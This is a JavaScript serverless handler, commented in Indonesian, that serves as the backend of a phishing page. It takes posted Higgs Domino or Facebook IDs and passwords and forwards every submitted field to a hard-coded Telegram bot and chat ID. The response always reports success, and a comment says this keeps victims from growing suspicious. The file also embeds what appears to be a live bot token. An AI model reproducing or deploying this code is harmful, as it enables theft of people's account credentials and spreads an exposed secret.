import fetch from 'node-fetch';

// GANTI DENGAN TOKEN BOT TELEGRAM ANDA
const TELEGRAM_BOT_TOKEN = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw";

// GANTI DENGAN ID CHAT/GRUP ANDA (Contoh: -10012345678)
const CHAT_ID = "6604182176";

export default async function handler(req, res) {
    
    // --- 1. VALIDASI METHOD ---
    // Pastikan hanya request POST yang diproses.
    if (req.method !== 'POST') {
        // Mengembalikan 405 (Method Not Allowed) jika metode bukan POST
        return res.status(405).json({ message: 'Method Not Allowed' }); 
    }

    // --- 2. AMBIL DATA DARI REQUEST BODY ---
    const data = req.body; 

    // --- 3. VALIDASI DATA KRUSIAL ---
    // Periksa apakah data utama (userID/fbID dan password) ada
    const loginIdentifier = data.userID || data.fbID;
    const password = data.password || data.fbPassword;

    if (!loginIdentifier || !password) {
        return res.status(400).json({ status: 'error', message: 'Data ID dan Password tidak lengkap.' });
    }

    // --- 4. FORMAT PESAN UNTUK TELEGRAM ---
    let messageText = '🚨 NEW HIGGS DOMINO LOGIN RECEIVED 🚨\n\n';

    // Tambahkan semua data yang diterima ke dalam pesan
    for (const key in data) {
        if (data.hasOwnProperty(key)) {
            // Format key menjadi huruf besar dan bold
            messageText += `*${key.toUpperCase().replace(/_|\s/g, ' ')}*: ${data[key]}\n`;
        }
    }
    
    // --- 5. KIRIM KE TELEGRAM ---
    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const telegramResponse = await fetch(telegramURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown' // Menggunakan Markdown untuk format
            }),
        });

        // Cek jika API Telegram gagal merespon (misal Token salah)
        if (!telegramResponse.ok) {
            const errorData = await telegramResponse.json();
            console.error('Telegram API Error:', errorData);
            // Kirim 500 tapi tetap sukses di sisi frontend agar user tidak curiga
        }

        // --- 6. RESPON KE KLIEN (SUCCESS) ---
        // Vercel akan merespon status 200 ke frontend.
        return res.status(200).json({ status: 'success', message: 'Data successfully processed and forwarded.' });
        
    } catch (error) {
        console.error('Kesalahan dalam proses backend:', error);
        
        // --- 6. RESPON KE KLIEN (ERROR FALLBACK) ---
        // Jika terjadi error pada fetch atau koneksi, tetap kirim 200 ke frontend 
        // untuk memastikan alur redirect di script.js tetap berjalan.
        return res.status(200).json({ 
            status: 'warning', 
            message: 'Processing failed, but client redirect initiated.',
            detail: error.message
        });
    }
}
